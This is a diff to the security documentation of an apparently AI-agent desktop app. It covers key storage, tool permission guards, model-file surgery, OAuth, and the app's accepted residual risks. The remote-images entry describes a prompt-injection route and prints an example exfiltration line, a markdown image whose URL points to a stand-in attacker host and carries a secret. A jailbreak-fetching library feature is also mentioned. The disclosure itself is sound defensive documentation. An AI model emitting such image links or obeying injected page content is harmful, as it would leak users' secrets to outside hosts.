@@ -7,7 +7,7 @@ secrets are protected.
 ## What leaves your computer
 
 - **Prompts and tool results** are sent only to the API provider *you*
-  configured (your key, your Base URL) — the same traffic as any OpenAI-compatible
+  configured (your key, your Base URL), the same traffic as any OpenAI-compatible
   chat client. Nocturn adds no middleman.
 - **Browser Use** drives a local headless Chromium via CDP. Pages the agent
   visits are fetched by your machine, from your network.
@@ -16,17 +16,17 @@ secrets are protected.
 
 ## What is stored locally
 
-- `%APPDATA%/com.haloui.app` (Windows) — settings, sessions, projects, notes,
+- `%APPDATA%/com.haloui.app` (Windows), settings, sessions, projects, notes,
   automation schedules, usage stats, browser-view state.
 - API keys are stored in plain settings.json **unless** key encryption is
   enabled (recommended): then keys are AES-256-GCM encrypted (RustCrypto
   `aes-gcm`, standard `nonce ‖ ciphertext ‖ tag` layout), and the vault key is
   derived from your master password with **Argon2id** (OWASP parameters,
   19 MiB / t=2). Vaults created on the legacy PBKDF2 KDF are upgraded to
-  Argon2id transparently on the next successful unlock — all encrypted fields
+  Argon2id transparently on the next successful unlock, all encrypted fields
   are re-keyed in place.
 - Project checkpoints are plain-text snapshots under
-  `appdata/checkpoints/` — they contain your code; disk encryption is your friend.
+  `appdata/checkpoints/`, they contain your code; disk encryption is your friend.
 
 ## Agent tool surface
 
@@ -39,7 +39,7 @@ browser. Guards:
 - hooks (PreToolUse) can block any call;
 - Hard Limits abort a run when token/$ budgets are exceeded.
 
-Review what you approve — "Always for this task" persists the decision in the
+Review what you approve, "Always for this task" persists the decision in the
 session store.
 
 ## GGUF Lab (local model surgery)
@@ -59,12 +59,12 @@ tools operate on GGUF files inside a dedicated lab storage
   `..` and non-`.gguf` names). The single exception is the llama-server
   path you set yourself (`gguf_llama_set_path`, UI/settings surface): it
   passes the sensitive-path guard with canonicalization and must point at
-  an existing file — and it is never reachable from a shared/imported
+  an existing file, and it is never reachable from a shared/imported
   config without the explicit executable-config confirmation below.
   Surgery always writes a new file
   (`temp + fsync + rename`); the source is never modified in place.
 - **Network sources, all explicit.** Pulling models talks to *your* local
-  Ollama server (`127.0.0.1:11434`) — the same traffic as running
+  Ollama server (`127.0.0.1:11434`), the same traffic as running
   `ollama pull` yourself. Downloading the optional `llama-server` binary
   hits `api.github.com` / GitHub release assets once per button press
   (CPU build, ~18.5 MB); there is no background fetching.
@@ -77,14 +77,14 @@ tools operate on GGUF files inside a dedicated lab storage
   surviving tensor bytes are compared byte-for-byte against the source
   before the result is renamed into place.
 - **Agent tools.** `gguf_cut` and `gguf_test` are classified mutating in
-  `perm.rs` and its frontend mirror (`toolFilter.ts`) — they ask for
+  `perm.rs` and its frontend mirror (`toolFilter.ts`), they ask for
   confirmation in Ask mode and are blocked in Plan mode, like `shell_run`.
   `gguf_inspect` is read-only. Importing a model into Ollama (`/api/create`)
   is UI-gated behind the same operation guard as the panel actions.
 
 ## Known residual risks (design trade-offs)
 
-- **Symlink TOCTOU on path writes — closed (2026-10-04).** File writes used
+- **Symlink TOCTOU on path writes, closed (2026-10-04).** File writes used
   to validate the path (canonicalize + sensitive-path check) and then write
   through the normal filesystem, so a local process racing the agent could
   swap a path component for a symlink between check and write. Agent-facing
@@ -99,7 +99,7 @@ tools operate on GGUF files inside a dedicated lab storage
   final path and is refused; a swap after the open cannot move the handle's
   target. Residual: the `O_CREAT` side effect can leave an empty file at a
   swapped location before the refusal (same-user litter, no data written),
-  and tool **reads** (`fs_read`, `fs_grep`) still follow symlinks — a racing
+  and tool **reads** (`fs_read`, `fs_grep`) still follow symlinks, a racing
   local process could point a read at another file; the content goes to the
   user's own configured provider and is visible in the tool card. Accepted
   (single-user machine; reads are a much weaker target than writes).
@@ -107,7 +107,7 @@ tools operate on GGUF files inside a dedicated lab storage
   import (Codex-style `config.toml`) and knowledge-base indexing can read
   arbitrary user-chosen files (system locations are rejected). This is the
   feature; the webview process is the trust boundary. The provider-config
-  parser copies only endpoints/wire/model into a profile — token
+  parser copies only endpoints/wire/model into a profile, token
   environment references (`$VAR`, `env:VAR`) are imported empty, so no
   third-party secret material lands on disk; the API key is pasted by you.
 - **Executable configs.** `hooks.json`, `mcp.json`, `lsp.json` and
@@ -115,29 +115,29 @@ tools operate on GGUF files inside a dedicated lab storage
   (hooks via `cmd /C`, MCP/LSP server commands, the llama-server path).
   They are only written through an explicit confirmation flow
   (`allowExecutableConfigs`, mirrored by `describeExecutableConfigs` on
-  the frontend) — treat any file claiming to be a Nocturn config as
+  the frontend), treat any file claiming to be a Nocturn config as
   untrusted input.
 - **Remote images in model output.** The CSP allows `img-src https:` so
   markdown images returned by providers render inline. A prompt injection
   (e.g. in a page the agent reads via Browser Use) could abuse this as a
   passive exfiltration channel: `![](https://attacker/?d=<secret>)` sends one
-  GET outside the `connect-src` fence. This is an accepted trade-off —
+  GET outside the `connect-src` fence. This is an accepted trade-off.
   rendering provider images is a deliberate feature; if you do not need
   remote images, remove `https:` from `img-src` in `src-tauri/tauri.conf.json`.
 - **Lyrics lookups (opt-in, off by default).** The media mini-bar can fetch
-  synced lyrics from lrclib.net — a free, keyless API. When enabled, it
+  synced lyrics from lrclib.net, a free, keyless API. When enabled, it
   sends the track title and artist name (nothing else). Playback state and
   control never leave the machine: they go through the OS media controls
   (SMTC on Windows), with no Spotify account or network involved.
 - **YouTube player (opt-in, radio with the Spotify integration).** Uses
   only the official embed (`www.youtube.com`, with
-  `www.youtube-nocookie.com` as a fallback host) — the sanctioned embedding
+  `www.youtube-nocookie.com` as a fallback host), the sanctioned embedding
   path, no keys, no OAuth, no stream extraction or ad bypass. The CSP
   widens `frame-src` to those hosts only (static in tauri.conf.json; the
-  app never renders third-party iframes from chat content — raw HTML in
+  app never renders third-party iframes from chat content, raw HTML in
   markdown is disabled, so the widened frame-src is exercised exclusively
   by the player). The embed URL carries `origin`/`widget_referrer` = the
-  app's own origin — desktop WebViews do not send a Referer header for
+  app's own origin, desktop WebViews do not send a Referer header for
   iframes, and without it YouTube rejects playback (error 150/153).
   Video thumbnails are fetched from `i.ytimg.com` (covered by the existing
   `img-src https:`). You paste links yourself; the queue and volume live
@@ -146,7 +146,7 @@ tools operate on GGUF files inside a dedicated lab storage
 - **Telegram notifications (opt-in, off by default).** You create your own
   bot via @BotFather and paste the token; it is stored encrypted
   (`enc:v1:…`) and excluded from settings export. The bot talks ONLY to
-  the chat bound by the first `/start` — messages from any other chat are
+  the chat bound by the first `/start`, messages from any other chat are
   ignored silently, and a second chat can never take over the binding.
   Outbound traffic is limited to short text messages to `api.telegram.org`
   for the events you enabled (task start / finish / error / confirmation
@@ -154,7 +154,7 @@ tools operate on GGUF files inside a dedicated lab storage
   With the toggle off the module makes zero network requests.
 - **Jailbreak live search (opt-in, explicit click only).** The library can
   fetch files from a small, curated whitelist of public GitHub repositories
-  when the user presses "Search sources" — nothing is contacted otherwise
+  when the user presses "Search sources", nothing is contacted otherwise
   and there are no background updates. The user's search query **never
   leaves the machine**: repository files are downloaded in full (public
   http/https only, the same SSRF filter that guards Browser Use, 32 MB
@@ -173,8 +173,8 @@ sensitive reports, contact the maintainers privately first.
 Удалённые MCP-серверы с `auth: "oauth"` проходят браузерную авторизацию
 (Authorization Code + PKCE, RFC 7636/8414/7591-DCR). Гарантии:
 
-- **Никаких фоновых запросов**: discovery/авторизация — только по кнопке
-  «Authorize»; refresh — только по 401 в активном вызове (single-flight:
+- **Никаких фоновых запросов**: discovery/авторизация только по кнопке
+  «Authorize»; refresh только по 401 в активном вызове (single-flight:
   ровно один запрос к провайдеру при N параллельных 401); автоконнект
   oauth-серверов при старте отключён.
 - **Loopback-listener**: только 127.0.0.1, эфемерный порт, параметр state
@@ -182,7 +182,7 @@ sensitive reports, contact the maintainers privately first.
 - **Хранение токенов**: зашифрованный mcp-oauth.json (AES-256-GCM тем же
   стеком, что настройки). Vault заперт / ключа нет → токены живут только
   в памяти процесса (Authorize помечает «session-only»).
-- **Отзыв**: кнопка Revoke — RFC 7009 revocation (best-effort) + локальная
+- **Отзыв**: кнопка Revoke: RFC 7009 revocation (best-effort) + локальная
   очистка токенов.
 - Риски на стороне пользователя: провайдер авторизации видит попытку
   входа; Nocturn никаких сервисов не рекомендует и не выбирает.
